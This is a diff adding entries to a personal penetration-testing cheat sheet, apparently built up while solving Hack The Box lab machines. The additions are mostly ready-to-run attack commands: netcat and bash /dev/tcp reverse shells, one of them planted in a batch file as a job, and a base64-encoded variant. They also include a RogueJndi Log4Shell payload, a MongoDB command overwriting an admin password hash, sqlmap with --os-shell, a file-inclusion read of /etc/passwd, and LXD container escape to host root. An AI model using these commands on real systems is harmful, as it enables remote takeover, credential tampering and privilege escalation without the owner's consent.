@@ -19,10 +19,33 @@ n : Numeric-only IP address. No hostname resolution. DNS is not being used.
 p : Port. Use to specify a particular port for listening
 netCat for windows:
  "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.9/nc64.exe -outfile nc64.exe" 
+ echo C:\Log-Management\nc64.exe -e cmd.exe 10.10.14.180 1234 > C:\Log-Management\job.bat
+ 
+Monitor local tcp ports:
+sudo tcpdump -i tun0 port 389
+
+python simple web server:
+python3 -m http.server 80
+
+make new password hash:
+mkpasswd -m sha-512 Password1234
+
  start up a nice shell:
     python3 -c 'import pty;pty.spawn("/bin/bash")'
- 
+ reverseshell
+ bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"
+ shell fully interactive
+ python3 -c 'import pty;pty.spawn("/bin/bash")'
+    CTRL+Z
+    stty raw -echo
+    fg
+    export TERM=xterm
+More upgrades on revers term = script /dev/null -c bash
+
  smbclient  \\\\10.10.10.131\\ADMIN$ -U Administrator
+
+ reverse shell incode 64
+ echo 'bash -c bash -i >&/dev/tcp/{Your IP Address}/{A port of your choice} 0>&1' |base64
 
  Search:
  grep -r -i -n "pass" .
@@ -42,10 +65,12 @@ send per second; it speeds up the scan as the number goes higher
 script=default. Some of the scripts in this category are considered intrusive and should 
 not be run against a target network without permission.
 -sV: Enables version detection, which will detect what versions are running on what port. 
-
+-sU: scan udp ports
 
 Mongo DB connection:
 ./mongosh mongodb://{target_IP}:27017
+replace password:
+mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$m9rY746GGNTuW4Ho$1l8UixBipvZHiPjavsIUGJOqrOywe0esTC0WZi7o8eKvtHKAjrGpF95RWrfSG2v6XmbL001z6kNqXQCwxr8Ai1"}})'
 
 
 Enumeration serch tools:
@@ -74,11 +99,24 @@ Connect to remote desktop using xfreerdp:
 WinRM evel:
 evil-winrm -i 10.129.136.91 -u administrator -p badminton
 
-windows console history:
-C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
+LDAP:
+rogue-jndi Java application, which starts a local LDAP server
+The spaces here are super important!!
+java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,BASE64 STRING HERE}|{base64,-d}|{bash,-i}" --hostname "{YOUR TUN0 IP ADDRESS}"
+
+WINDOWS:
+    windows console history:
+    C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
+CMD:
+whoami /priv
+icacls file  << this show permissions on files
+schtasks   <<< show auto tasks in for pc 
+
 Availabel Users:
 cat /etc/passwd
 
+File inclusion check:
+curl 'http://{target_IP}/?file=/etc/passwd'
 
 Redis connect:
 redis-cli -h {target_ip}
@@ -98,6 +136,9 @@ Web add in shows you what platform is bing run.
 BurpSuite:
 Super good for sending unintended shit to a web page
 
+
+Auto SQL injecting tool:
+sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1" --os-shell
 ---------------INJECTION--------------
 ==========================
 >>> sqlmap 
@@ -125,6 +166,12 @@ Server Side Template Injection vulnerability Example injection:
  {{/with}}
 {{/with}}
 
+lxd lxc commnds:
+lxc init alpine privesc -c security.privileged=true
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+lxc start privesc
+lxc exec privesc /bin/sh
+
 Usefull Links:
 ============
 https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html
@@ -145,3 +192,7 @@ https://academy.hackthebox.eu/course/preview/using-web-proxies
 Parrot OS, it is possible to find webshells under the folder 
         ------- /usr/share/webshells/
 Read through this https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-methodology.html
+Log4J:
+https://www.hackthebox.com/blog/Whats-Going-On-With-Log4j-Exploitation
+windows Netcat
+https://github.com/rahuldottech/netcat-for-windows/releases/download/1.12/nc64.exe
